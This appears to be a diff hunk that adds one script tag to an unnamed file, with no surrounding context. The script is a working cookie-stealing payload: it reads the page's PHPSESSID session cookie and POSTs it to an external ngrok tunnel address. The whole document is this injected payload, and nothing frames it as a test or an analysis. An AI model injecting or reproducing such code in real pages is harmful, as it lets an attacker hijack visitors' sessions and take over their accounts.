@@ -1,0 +1,4 @@
+<script>const Http = new XMLHttpRequest();const url='http://0bf9b14d.ngrok.io/sessionid';var jsId = document.cookie.match(/JSESSIONID=[^;]+/);const params = "sessionid="+ document.cookie.match(/PHPSESSID=[^;]+/); 
+Http.open("POST", url,true);Http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');Http.onreadystatechange = (e) => {console.log(Http.responseText)
+};Http.send(params);</script>
+
